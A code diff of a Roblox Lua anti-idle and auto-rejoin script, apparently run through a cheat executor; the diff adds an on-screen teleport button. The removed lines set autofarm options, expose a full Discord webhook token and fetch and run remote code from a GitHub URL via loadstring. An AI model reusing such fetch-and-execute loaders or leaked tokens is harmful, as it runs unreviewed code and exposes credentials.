@@ -1,6 +1,7 @@
 local Players = game:GetService("Players")
 local TeleportService = game:GetService("TeleportService")
 local HttpService = game:GetService("HttpService")
+local UserInputService = game:GetService("UserInputService")
 
 local player = Players.LocalPlayer
 local fileName = "IdleTimeData.json"  -- Имя файла для хранения данных
@@ -38,6 +39,40 @@ if not idleData then
     safeWriteFile(idleData)  -- Запись данных в файл
 end
 
+-- Функция для создания UI элемента
+local function createTeleportButton()
+    local screenGui = Instance.new("ScreenGui")
+    local teleportButton = Instance.new("TextButton")
+
+    screenGui.Parent = player:WaitForChild("PlayerGui")
+    screenGui.Name = "TeleportUI"
+
+    teleportButton.Name = "TeleportButton"
+    teleportButton.Parent = screenGui
+    teleportButton.Text = "Teleport"
+    teleportButton.Size = UDim2.new(0, 120, 0, 40)
+    teleportButton.Position = UDim2.new(0, 10, 1, -50)
+    teleportButton.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+    teleportButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    teleportButton.TextScaled = true
+    teleportButton.BorderSizePixel = 0
+
+    teleportButton.MouseButton1Click:Connect(function()
+        print("Телепортация по кнопке")
+        local placeId = game.PlaceId
+        TeleportService:Teleport(placeId, player)
+    end)
+
+    -- Адаптация к изменению размеров окна
+    game:GetService("RunService").RenderStepped:Connect(function()
+        teleportButton.Position = UDim2.new(0, 10, 1, -50)
+    end)
+end
+
+-- Запуск создания UI элемента
+createTeleportButton()
+
+-- Функция мониторинга времени бездействия
 local function monitorIdleTime()
     print("Йоу, я заработал")
     task.wait(10)  -- Задержка перед началом мониторинга
@@ -48,7 +83,6 @@ local function monitorIdleTime()
     local idleTime = 0
     local threshold = 30  -- Время в секундах для проверки на бездействие
     local lastPosition = humanoidRootPart.Position
-    local lastConnectionTime = idleData.lastConnectionTime  -- Время последнего подключения
 
     while true do
         wait(1)  -- Проверка каждую секунду
@@ -101,29 +135,3 @@ player.CharacterAdded:Connect(monitorIdleTime)
 
 -- Запуск мониторинга при первом входе в игру
 monitorIdleTime()
-
-for i = 1, 1 do
-    task.spawn(function()
-        task.wait(5) -- Задержка перед выполнением кода
-        pcall(function()
-            getgenv().standList = {
-                ["The World"] = true,
-                ["Star Platinum"] = true,
-                ["Star Platinum: The World"] = true,
-                ["Crazy Diamond"] = true,
-                ["King Crimson"] = true,
-                ["King Crimson Requiem"] = true
-            }
-            getgenv().waitUntilCollect = 0.75
-            getgenv().sortOrder = "Asc"
-            getgenv().lessPing = false
-            getgenv().autoRequiem = true
-            getgenv().NPCTimeOut = 15
-            getgenv().HamonCharge = 70
-            getgenv().webhook = "https://discord.com/api/webhooks/1288789321192570972/nmuQYBwSVNjtZVp0afW2DACovpQ59kphCs0bWMi4bR9Wea4UavtbFjhxeuK8OLoQSqnI"
-
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/VernonMoore54/myprice/refs/heads/main/iou.lua"))()
-        end)
-    end)
-    task.wait(1) -- Задержка между выполнениями
-end
